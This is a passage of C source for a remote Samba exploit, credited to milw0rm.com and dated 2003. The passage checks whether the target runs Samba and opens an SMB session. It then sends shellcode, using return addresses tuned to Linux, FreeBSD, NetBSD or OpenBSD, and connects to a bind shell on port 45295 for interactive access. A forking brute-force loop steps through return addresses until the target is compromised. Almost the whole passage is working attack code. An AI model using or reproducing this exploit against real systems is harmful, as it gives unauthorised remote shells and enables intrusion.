                addr2.sin_port   = htons(45295);

                if (connect(sock, (struct sockaddr *)&addr1, sizeof(addr1)) == -1) {
                        fprintf(stderr, "+ connect() error.\n");
                        return -1;
                }

                if (verbose == 1) fprintf(stdout, "+ %s\n", targets[type - 1].type);

                if (force == 0) {

                        if (is_samba(argv[optind], 2) != 0) {
                                fprintf(stderr, "+ Host is not running samba!\n\n");
                                return -1;
                        }

                        fprintf(stderr, "+ Host is running samba.\n");
                }

                if (verbose == 1) fprintf(stdout, "+ Connected to [%s:%d]\n", (char *)inet_ntoa(addr1.sin_addr), port);

                if (start_session(sock) < 0) fprintf(stderr, "+ Session failed.\n");

                if (verbose == 1) fprintf(stdout, "+ Session enstablished\n");
                sleep(5);
                if (targets[type - 1].os_type != 2) {
                        if (exploit_normal(sock, ret, shellcode) < 0) {
                                fprintf(stderr, "+ Failed.\n");
                                close(sock);
                        }
                } else {
                        if (exploit_openbsd32(sock, ret, shellcode) < 0) {
                                fprintf(stderr, "+ Failed.\n");
                                close(sock);
                        }
                }

                sleep(2);

                if (connectback == 0) {
                        if(connect(sock2, (struct sockaddr *)&addr2, sizeof(addr2)) == -1) {
                                fprintf(stderr, "+ Exploit failed, try -b to bruteforce.\n");

                                return -1;
                        }

                        fprintf(stdout, "--------------------------------------------------------------\n");

                        shell(sock2);
                        close(sock);
                        close(sock2);
                } else {
                        fprintf(stdout, "+ Done...\n");
                        close(sock2);
                        close(sock);
                }
                return 0;
        }

        signal(SIGPIPE, SIG_IGN);
        signal(SIGUSR1, handler);

        switch(brute) {
                case 0:
                        if (ret == 0) ret = 0xc0000000;
                        shellcode = linux_bindcode;
                        fprintf(stdout, "+ Bruteforce mode. (Linux)\n");
                        break;
                case 1:
                        if (ret == 0) ret = 0xbfc00000;
                        shellcode = bsd_bindcode;
                        fprintf(stdout, "+ Bruteforce mode. (FreeBSD / NetBSD)\n");
                        break;
                case 2:
                        if (ret == 0) ret = 0xdfc00000;
                        shellcode = bsd_bindcode;
                        fprintf(stdout, "+ Bruteforce mode. (OpenBSD 3.1 and prior)\n");
                        break;
                case 3:
                        if (ret == 0) ret = 0x00170000;
                        shellcode = bsd_bindcode;
                        fprintf(stdout, "+ Bruteforce mode. (OpenBSD 3.2 - non-exec stack)\n");
                        break;
                }

        memcpy(&addr1.sin_addr, he->h_addr, he->h_length);
        memcpy(&addr2.sin_addr, he->h_addr, he->h_length);

        addr1.sin_family = AF_INET;
        addr1.sin_port   = htons(port);
        addr2.sin_family = AF_INET;
        addr2.sin_port   = htons(45295);

        for (i = 0; i < 100; i++)
                childs[i] = -1;
        i = 0;

        if (force == 0) {
                if (is_samba(argv[optind], 2) != 0) {
                        fprintf(stderr, "+ Host is not running samba!\n\n");
                        return -1;
                }

                fprintf(stderr, "+ Host is running samba.\n");
        }

        while (OWNED == 0) {

                if (sock  > 2) close(sock);
                if (sock2 > 2) close(sock2);

                if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {
                        if (verbose == 1) fprintf(stderr, "+ socket() error.\n");
                }
                else {
                        ret -= STEPS;
                        i++;
                }

                if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) < 0)
                        if (verbose == 1) fprintf(stderr, "+ socket() error.\n");


                if ((ret & 0xff) == 0x00 && brute != 3) ret++;

                if (verbose == 1) fprintf(stdout, "+ Using ret: [0x%08x]\n", (unsigned int)ret);

                usleep(BRUTE_DELAY);

                switch (childs[i] = fork()) {
                        case 0:
                                if(Connect(sock, (char *)inet_ntoa(addr1.sin_addr), port, 2) == -1) {
                                        if (sock  > 2) close(sock);
                                        if (sock2 > 2) close(sock2);
                                        exit(-1);
                                }

                                if(write_timer(sock, 3) == 1) {
                                        if (start_session(sock) < 0) {
                                                if (verbose == 1) fprintf(stderr, "+ Session failed.\n");
                                                if (sock  > 2)close(sock);
                                                if (sock2 > 2) close(sock2);
                                                exit(-1);
                                        }

                                        if (brute == 3) {
                                                if (exploit_openbsd32(sock, ret, shellcode) < 0) {
                                                        if (verbose == 1) fprintf(stderr, "+ Failed.\n");
                                                        if (sock  > 2) close(sock);
                                                        if (sock2 > 2) close(sock2);
                                                        exit(-1);
                                                }
                                        }
                                else {
                                        if (exploit_normal(sock, ret, shellcode) < 0) {
                                                if (verbose == 1) fprintf(stderr, "+ Failed.\n");
                                                if (sock  > 2) close(sock);
                                                if (sock2 > 2) close(sock2);
                                                exit(-1);
                                        }

                                        if (sock > 2) close(sock);

                                        if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) < 0) {
                                                if (sock2 > 2) close(sock2);
                                                exit(-1);
                                        }

                                        if(Connect(sock2, (char *)inet_ntoa(addr1.sin_addr), 45295, 2) != -1) {
                                                if (sock2  > 2) close(sock2);
                                                kill(getppid(), SIGUSR1);
                                        }

                                        exit(1);
                                }


                                exit(0);
                                break;
                        case -1:
                                fprintf(stderr, "+ fork() error\n");
                                exit(-1);
                                break;
                        default:
                                if (i > MAX_CHILDS - 2) {
                                        wait(&status);
                                        i--;
                                }
                                break;
                        }

                }

        }

        return 0;
}

// milw0rm.com [2003-04-10]